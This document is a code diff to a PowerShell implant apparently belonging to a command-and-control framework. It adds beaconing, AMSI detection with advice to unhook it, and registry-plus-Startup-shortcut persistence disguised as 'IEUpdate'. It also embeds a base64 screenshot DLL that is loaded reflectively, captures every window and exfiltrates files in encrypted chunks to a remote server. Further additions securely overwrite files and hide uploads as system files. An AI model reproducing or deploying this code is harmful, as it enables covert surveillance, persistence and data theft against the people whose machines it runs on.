@@ -7,6 +7,45 @@ function Test-Win64() {
 function Test-Win32() {
     return [IntPtr]::size -eq 4
 }
+Function Beacon($sleeptime) {
+    if ($sleeptime.ToLower().Contains('m')) { 
+        $sleeptime = $sleeptime -replace 'm', ''
+        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $newsleep * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('h')) { 
+        $sleeptime = $sleeptime -replace 'h', ''
+        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep2 = $newsleep1 * 60
+        [int]$newsleep = $newsleep2 * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('s')) { 
+        $newsleep = $sleeptime -replace 's', ''
+    } else {
+        $newsleep = $sleeptime
+    }
+    $script:sleeptime = $newsleep
+}
+New-Alias SetBeacon Beacon
+Function Turtle($sleeptime) {
+    if ($sleeptime.ToLower().Contains('m')) { 
+        $sleeptime = $sleeptime -replace 'm', ''
+        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $newsleep * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('h')) { 
+        $sleeptime = $sleeptime -replace 'h', ''
+        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep2 = $newsleep1 * 60
+        [int]$newsleep = $newsleep2 * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('s')) { 
+        $newsleep = $sleeptime -replace 's', ''
+    } else {
+        $newsleep = $sleeptime
+    }
+    Start-Sleep $newsleep
+}
 Function CheckArchitecture
 {
     if (Test-Win64) {
@@ -22,12 +61,17 @@ Function CheckArchitecture
     else {
         Write-Output "Unknown Architecture Detected"
     }
+    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Run Unhook-AMSI to unload Anti-Malware Scan Interface (AMSI)"} }
+}
+Function Get-Proxy {
+    Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 }
 Function CheckVersionTwo 
 {
     $psver = $PSVersionTable.psversion.Major
     if ($psver -ne '2') {
-        Write-Output "`n[+] Powershell version $psver detected. Run Invoke-DowngradeAttack to try using PS v2"
+        Write-Output "`n[+] Powershell version $psver detected. Run Inject-Shellcode with the v2 Shellcode"
+        Write-Output "[+] Warning AMSI, Constrained Mode, ScriptBlock/Module Logging could be enabled"
     }
 }
 $global:ImpUpgrade = $False
@@ -35,11 +79,13 @@ CheckArchitecture
 CheckVersionTwo
 Function StartAnotherImplant {
     if (($p = Get-Process | ? {$_.id -eq $pid}).name -ne "powershell") {
-        echo "Process is not powershell, try running migrate-x86 or migrate-64"
+        echo "Process is not powershell, try running migrate -x86 or migrate -x64"
     } else {
         if ($global:ImpUpgrade) {
+            echo "Start-Process Upgrade via CMD"
             start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
         } else {
+            echo "Start-Process via CMD"
             start-process -windowstyle hidden cmd -args "/c $payload"
         }
     }
@@ -88,7 +134,7 @@ function DisableRDP
         {
             Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
         } else {
-            netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
+            netsh advfirewall firewall del rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
         }
     } else {
     Write-Output "You are not elevated to Administator "
@@ -139,7 +185,7 @@ Function Install-Persistence
         Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666 -value "$payload"
         $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
         $SourceExe = "powershell.exe"
-        $ArgumentsToSourceExe = "-exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
+        $ArgumentsToSourceExe = "-exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper666"
         $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
         $WshShell = New-Object -comObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -148,7 +194,7 @@ Function Install-Persistence
         $Shortcut.WindowStyle = 7
         $Shortcut.Save()
         If ((Test-Path $DestinationPath) -and ($registrykey2.Wallpaper666)) {
-            Write-Output "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
+            Write-Output "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper666"
         } else {
             Write-Output "Error installing StartUp folder persistence"
         }
@@ -330,6 +376,35 @@ Function Get-Screenshot
     }
     return $b64
 }
+$psloadedscreen = $null
+function Get-ScreenshotAllWindows {
+
+    if ($psloadedscreen -ne "TRUE") {
+        $script:psloadedscreen = "TRUE"
+        $ps = "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AFZhbHVlVHlwZQBDYXB0dXJlAEVudW1XaW5kb3dTdGF0aW9uc0RlbGVnYXRlAEVudW1EZXNrdG9wc0RlbGVnYXRlAEVudW1EZXNrdG9wV2luZG93c0RlbGVnYXRlAE11bHRpY2FzdERlbGVnYXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLkRyYXdpbmcAZ2V0X1dpZHRoAG5XaWR0aAB3aWR0aABBc3luY0NhbGxiYWNrAGNhbGxiYWNrAGdkaTMyLmRsbABVc2VyMzIuZGxsAHVzZXIzMi5kbGwAU2NyZWVuc2hvdC5kbGwAbFBhcmFtAFN5c3RlbQBCb3R0b20AU2NyZWVuAENhcHR1cmVSZWdpb24AcmVnaW9uAFVuaW9uAHdpblN0YXRpb24Ad2luZG93c1N0YXRpb24AQ2xvc2VXaW5kb3dTdGF0aW9uAE9wZW5XaW5kb3dTdGF0aW9uAEdldFByb2Nlc3NXaW5kb3dTdGF0aW9uAFNldFByb2Nlc3NXaW5kb3dTdGF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAENyZWF0ZUNvbXBhdGlibGVCaXRtYXAARnJvbUhiaXRtYXAAZHdSb3AAZ2V0X1RvcABDYXB0dXJlRGVza3RvcABDbG9zZURlc2t0b3AAaERlc2t0b3AAT3BlbkRlc2t0b3AAT3BlbklucHV0RGVza3RvcABkZXNrdG9wAFN0cmluZ0J1aWxkZXIAaHduZENoaWxkQWZ0ZXIALmN0b3IAR3JhcGhpY3MAR2V0U3lzdGVtTWV0cmljcwBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X0JvdW5kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBuRmxhZ3MAU3lzdGVtLldpbmRvd3MuRm9ybXMAZ2V0X0FsbFNjcmVlbnMARW51bVdpbmRvd1N0YXRpb25zAEVudW1EZXNrdG9wcwBscHN6Q2xhc3MAbmVlZEFjY2VzcwBFbnVtRGVza3RvcFdpbmRvd3MAR2V0V2luZG93UmVjdABEZWxldGVPYmplY3QAaE9iamVjdABTZWxlY3RPYmplY3QAb2JqZWN0AHJlY3QAZ2V0X0xlZnQAUmlnaHQAZ2V0X0hlaWdodABuSGVpZ2h0AGZJbmhlcml0AEJpdEJsdABJQXN5bmNSZXN1bHQAcmVzdWx0AGh3bmRQYXJlbnQAbk1heENvdW50AFNjcmVlbnNob3QAaGRjRGVzdABueERlc3QAbnlEZXN0AFN5c3RlbS5UZXh0AGxwV2luZG93VGV4dABHZXRXaW5kb3dUZXh0AEZpbmRXaW5kb3cAR2V0RGVza3RvcFdpbmRvdwBQcmludFdpbmRvdwBscHN6V2luZG93AEZpbmRXaW5kb3dFeAB3b3JraW5nQXJlYU9ubHkARW1wdHkAAAAAAMgUTmDMAYJGtc9up0YeCB0ABCABAQgDIAABBSABARERBCABAQ4EIAEBAgkHBhgYGBgYEkEDIAAIBQABEkEYCgcEEUUdEkkIEkkDBhFFBQAAHRJJBCAAEUUIAAIRRRFFEUUFBwIRDBgFIAIBCAgGAAESZRJhAyAAGAQgAQEYCLd6XFYZNOCJCLA/X38R1Qo6BCAAzAAEAAAAQAQAAAACBH8DAAABAgEWAgYIAgYJDAAJAhgICAgIGAgICAYAAxgYCAgEAAEYGAMAABgFAAICGBgFAAIYGBgGAAESQRFFBAAAEkEFAAESQQIFAAIYDg4HAAQYGBgODgcAAhgYEBEMBgADAhgYCQQAAQgIBgACAhIQGAQAAQIYBgADGA4CCQcAAwIYEhQYBwAEGA4JAgkGAAMYCQIJBwADAhgSGBgHAAMIGBJNCAYAAhgYEBgFIAIBHBgFIAICDhgJ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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        $dllbytes  = [System.Convert]::FromBase64String($ps)
+        $assembly = [System.Reflection.Assembly]::Load($dllbytes)
+    }
+
+	$processes = Get-Process
+	foreach ($p in $processes)
+	{
+		try {
+		   	[IntPtr] $windowHandle = $p.MainWindowHandle;
+			$msimage = New-Object IO.MemoryStream
+            $bitmap = [WindowStation]::Capture($windowHandle);
+			$bitmap.save($msimage, "bmp")
+            $b64 = [Convert]::ToBase64String($msimage.toarray())
+            $bitmap.Dispose();
+            $ReadCommand = "get-screenshot"
+            $ReadCommand = Encrypt-String $key $ReadCommand
+            $send = Encrypt-String2 $key $b64
+            $UploadBytes = getimgdata $send
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+		} catch {}
+	}
+    $error.clear()
+}
 function Download-Files
 {
     param
@@ -339,15 +414,20 @@ function Download-Files
     $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
     foreach ($item in $files)
     {
-        $ReadCommand = "download-file "+$item.FullName
-        $ReadCommand = Encrypt-String $key $ReadCommand
-        $Output = Download-File $item.FullName       
-        $Output = Encrypt-String2 $key $Output
-        $UploadBytes = getimgdata $Output
-        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+        Download-File $item.FullName
     } 
-    $ReadCommand = "Files-downloaded"
-    $ReadCommand = Encrypt-String $key $ReadCommand
+}
+function Get-RandomName 
+{
+    param 
+    (
+        [int]$Length
+    )
+    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
+    $result = ''
+    for ($x = 0; $x -lt $Length; $x++) 
+    {$result += $set | Get-Random}
+    return $result
 }
 function Download-File
 {
@@ -355,24 +435,65 @@ function Download-File
     (
         [string] $Source
     )
- 
-    $Source = Resolve-PathSafe $Source
-     
-    $bufferSize = 90000
-    $buffer = New-Object byte[] $bufferSize
-     
-    $reader = [System.IO.File]::OpenRead($Source)
-    $base64 = $null
-     
-    $bytesRead = 0
-    do
-    {
-        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
-        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
-    } while ($bytesRead -eq $bufferSize);
+    try {
+        $fileName = Resolve-PathSafe $Source
+        $randomName = Get-RandomName -Length 5
+        $fileExt = [System.IO.Path]::GetExtension($fileName)
+        $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
+        $fullNewname = $Source
+        $bufferSize = 10737418;
 
-    $base64
-    $reader.Dispose()
+        $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
+        $fileSize =(Get-Item $fileName).Length
+        
+        $chunkSize = $fileSize / $bufferSize
+        $totalChunks = [int][Math]::Ceiling($chunkSize)
+        if ($totalChunks -lt 1) {$totalChunks = 1}
+        $totalChunkStr = $totalChunks.ToString("00000")
+        $totalChunkByte = [System.Text.Encoding]::UTF8.GetBytes($totalChunkStr)
+        $Chunk = 1
+        $finfo = new-object System.IO.FileInfo ($fileName)
+        $size = $finfo.Length
+        $str = New-Object System.IO.BinaryReader($fs);
+        do {
+            $ChunkStr = $Chunk.ToString("00000")
+            $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
+            $preNumbers = New-Object byte[] 10
+            $preNumbers = ($ChunkedByte+$totalChunkByte)
+            $readSize = $bufferSize;
+            $chunkBytes = $str.ReadBytes($readSize);
+            $ReadCommand = "download-file "+$fullNewname
+            $ReadCommand = Encrypt-String $key $ReadCommand
+            $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
+            $UploadBytes = getimgdata $send
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            ++$Chunk 
+        } until (($size -= $bufferSize) -le 0);
+    } catch {
+        $Output = "ErrorCmd: " + $error[0]
+        $ReadCommand = "Error downloading file "+$fullnewname
+        $ReadCommand = Encrypt-String $key $ReadCommand  
+        $send = Encrypt-String2 $key $output
+        $UploadBytes = getimgdata $send
+        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+    } 
+}
+function Posh-Delete
+{
+    param
+    (
+        [string] $Destination
+    )
+    try {
+    $file = Get-Item $Destination -Force
+    $file.Attributes = "Normal"
+    $content = New-Object Byte[] $file.length 
+    (New-Object Random).NextBytes($content)
+    [IO.File]::WriteAllBytes($file,$content)
+    Remove-Item $Destination -Force
+    } catch {
+    echo $error[0]
+    }
 }
 function Upload-File 
 {
@@ -381,10 +502,18 @@ function Upload-File
         [string] $Base64,
         [string] $Destination
     )
-    write-output "Uploaded file to: $Destination"
+    try {
+    write-output "Uploaded file as HIDDEN & SYSTEM to: $Destination"
+    write-output "Run Get-ChildItem -Force to view the uploaded files"
     $fileBytes = [Convert]::FromBase64String($Base64)
     [io.file]::WriteAllBytes($Destination, $fileBytes)
-                
+    $file = Get-Item $Destination -Force
+    $attrib = $file.Attributes
+    $attrib = "Hidden,System"
+    $file.Attributes = $attrib  
+    } catch {
+    echo $error[0]
+    }  
 }
 function Resolve-PathSafe
 {
@@ -405,7 +534,7 @@ $password,
 [string]
 $computer
 )
